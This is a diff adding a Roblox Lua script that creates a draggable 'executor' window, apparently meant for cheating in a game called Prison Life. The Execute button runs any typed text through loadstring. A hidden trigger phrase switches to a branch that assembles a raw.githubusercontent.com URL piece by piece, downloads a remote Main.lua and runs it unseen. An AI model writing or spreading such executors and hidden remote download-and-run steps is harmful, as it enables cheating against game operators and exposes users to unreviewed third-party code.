@@ -1,0 +1,152 @@
+local ExecutorGui = Instance.new("ScreenGui")
+
+local Frame = Instance.new("Frame")
+
+local Close = Instance.new("TextButton")
+
+local Input = Instance.new("TextBox")
+
+local ExecuteButton = Instance.new("TextButton")
+
+local Clear = Instance.new("TextButton")
+
+ExecutorGui.Name = "ExecutorGui"
+
+ExecutorGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Frame.Name = "Frame"
+
+Frame.Parent = ExecutorGui
+
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+
+Frame.BorderSizePixel = 0
+
+Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+Frame.Size = UDim2.new(0, 348, 0, 240)
+
+Frame.Visible = true
+
+Frame.Active = true
+
+Frame.Draggable = true
+
+Close.Name = "Close"
+
+Close.Parent = Frame
+
+Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+
+Close.Position = UDim2.new(0.92929244, 0, 0, 0)
+
+Close.Size = UDim2.new(0, 24, 0, 24)
+
+Close.Font = Enum.Font.SourceSans
+
+Close.Text = "X"
+
+Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+Close.TextScaled = true
+
+Close.TextSize = 14.000
+
+Close.TextWrapped = true
+
+Close.MouseButton1Click:Connect(function()
+
+Frame.Visible = false
+
+end)
+
+Input.Name = "Input"
+
+Input.Parent = Frame
+
+Input.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+Input.Position = UDim2.new(0.209770113, 0, 0.174999997, 0)
+
+Input.Size = UDim2.new(0, 200, 0, 50)
+
+Input.Font = Enum.Font.SourceSans
+
+Input.Text = "Executor Made by ErrNatsuki"
+
+Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+Input.TextSize = 22.000
+
+ExecuteButton.Name = "ExecuteButton"
+
+ExecuteButton.Parent = Frame
+
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(85, 255, 255)
+
+ExecuteButton.Position = UDim2.new(0.0632183924, 0, 0.470833331, 0)
+
+ExecuteButton.Size = UDim2.new(0, 135, 0, 50)
+
+ExecuteButton.Font = Enum.Font.SourceSans
+
+ExecuteButton.Text = "Execute"
+
+ExecuteButton.TextColor3 = Color3.fromRGB(85, 0, 127)
+
+ExecuteButton.TextSize = 14.000
+
+Clear.Name = "Clear"
+
+Clear.Parent = Frame
+
+Clear.BackgroundColor3 = Color3.fromRGB(85, 255, 255)
+
+Clear.Position = UDim2.new(0.537356317, 0, 0.470833331, 0)
+
+Clear.Size = UDim2.new(0, 136, 0, 50)
+
+Clear.Font = Enum.Font.SourceSans
+
+Clear.Text = "Clear"
+
+Clear.TextColor3 = Color3.fromRGB(85, 0, 127)
+
+Clear.TextSize = 14.000
+
+Clear.MouseButton1Click:Connect(function()
+
+Input.Text = ""
+
+end)
+
+function Exe(loadstr)
+
+loadstring((loadstr))()
+
+end
+
+ExecuteButton.MouseButton1Click:Connect(function()
+
+local msg = Input.Text
+
+if Input.Text == "Loadstring(gsub:(nil,G).str.local.Http)" then
+
+Exe([[coroutine.wrap(function()
+
+local Raw = "raw.githubusercontent.com"
+
+local file = "Main.lua"
+
+loadstring(game:HttpGet(("https://"..Raw.."/BkYuris/Prison-Life-Source-Main-Arg-B/main/"..file.."")))()
+
+end)()]])
+
+else
+
+Exe(msg)
+
+end
+
+end)
+
